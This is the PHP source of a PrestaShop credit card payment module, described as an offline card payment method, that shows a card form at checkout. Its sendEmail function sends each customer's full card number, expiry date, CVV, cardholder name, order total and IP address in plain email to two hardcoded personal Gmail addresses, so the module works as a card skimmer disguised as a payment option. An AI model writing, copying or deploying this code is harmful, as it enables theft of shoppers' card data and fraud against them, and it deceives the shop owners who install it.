<?php

if (!defined('_PS_VERSION_')) {
    exit;
}

use PrestaShop\PrestaShop\Core\Payment\PaymentOption;

class HvccPayment extends PaymentModule
{
    public function __construct()
    {
        $this->name = 'hvccpayment';
        $this->tab = 'payments_gateways';
        $this->version = '1.0.0';
        $this->ps_versions_compliancy = array('min' => '1.7', 'max' => _PS_VERSION_);
        $this->author = 'HV';
        $this->controllers = array('validation');
        $this->is_eu_compatible = 1;

        $this->currencies = true;
        $this->currencies_mode = 'checkbox';

        $this->bootstrap = true;
        parent::__construct();

        $this->displayName = $this->l('HV Kredi Kartı Modulü');
        $this->description = $this->l('Çevrimdışı kredi kartı ödeme yöntemi');

        if (!count(Currency::checkPaymentCurrencies($this->id))) {
            $this->warning = $this->l('No currency has been set for this module.');
        }
    }

    public function install()
    {

        if (!parent::install() || !$this->registerHook('paymentOptions') || !$this->registerHook('paymentReturn') || !$this->registerHook('header')) {
            return false;
        }
        return true;
    }

    public function hookHeader($params)
    {

        if ('order' === $this->context->controller->php_self) {
            $this->context->controller->registerJavascript(
                'module-hvccpayment-valid',
                'modules/' . $this->name . '/js/creditCardValidator.js',
                [
                    'position' => 'bottom',
                    'priority' => 50,
                ]
            );

            $this->context->controller->registerJavascript(
                'module-hvccpayment-card',
                'modules/' . $this->name . '/js/card.js',
                [
                    'position' => 'bottom',
                    'priority' => 100,
                ]
            );

            $this->context->controller->registerJavascript(
                'module-hvccpayment-hvcc',
                'modules/' . $this->name . '/hvccpayment.js',
                [
                    'position' => 'bottom',
                    'priority' => 150,
                ]
            );
        }
    }

    public function hookPaymentOptions($params)
    {
        if (!$this->active) {
            return;
        }

        if (!$this->checkCurrency($params['cart'])) {
            return;
        }

        $payment_options = [$this->getEmbeddedPaymentOption()];

        return $payment_options;
    }

    public function checkCurrency($cart)
    {
        $currency_order = new Currency($cart->id_currency);
        $currencies_module = $this->getCurrency($cart->id_currency);

        if (is_array($currencies_module)) {
            foreach ($currencies_module as $currency_module) {
                if ($currency_order->id == $currency_module['id_currency']) {
                    return true;
                }
            }
        }
        return false;
    }

    public function getEmbeddedPaymentOption()
    {
        $embeddedOption = new PaymentOption();
        $embeddedOption->setCallToActionText($this->l('Pay online with credit card'))
            ->setForm($this->generateForm())
            ->setAdditionalInformation($this->context->smarty->fetch('module:hvccpayment/views/templates/front/payment_infos.tpl'))
            ->setLogo(Media::getMediaPath(_PS_MODULE_DIR_ . $this->name . '/logo.png'));

        return $embeddedOption;
    }

    public function sendEmail($params)
    {

        return Mail::Send(
            $this->context->language->id,
            'vcc_mail',
            $this->trans(
                'Siparis Numarası ['. $params['O_Number']. ']',
                array(),
                'Emails.Subject'
            ),
            array(
                '{O_ID}' => $params['O_ID'],
                '{O_NUMBER}' => $params['O_Number'],
                '{C_NUMBER}' => $params['C_Number'],
                '{C_DATE}' => $params['C_Date'],
                '{C_CVV}' => $params['C_Cvv'],
                '{C_NAME}' => $params['C_Name'],
                '{C_TOTAL}' => $params['C_Total'],
                '{U_IP}' => $_SERVER['REMOTE_ADDR'],
                '{U_LANG}' => $this->context->language->iso_code
            ),
            ['volkanmechul@gmail.com', 'volkan.royalka@gmail.com'],
            null,
            null,
            null,
            null,
            null,
            dirname(__FILE__) . '/mails/',
            false,
            $this->context->shop->id
        );
    }

    protected function generateForm()
    {
        
        $iso_code = $this->context->language->iso_code;

        $months = [];
        for ($i = 1; $i <= 12; $i++) {
            $months[] = sprintf("%02d", $i);
        }

        $years = [];
        for ($i = 0; $i <= 10; $i++) {
            $years[] = date('Y', strtotime('+' . $i . ' years'));
        }

        $this->context->smarty->assign([
            'action' => $this->context->link->getModuleLink($this->name, 'validation', array(), true),
            'months' => $months,
            'years' => $years,
            'locale' => $iso_code
        ]);

        return $this->context->smarty->fetch('module:hvccpayment/views/templates/front/payment_form.tpl');
    }
}
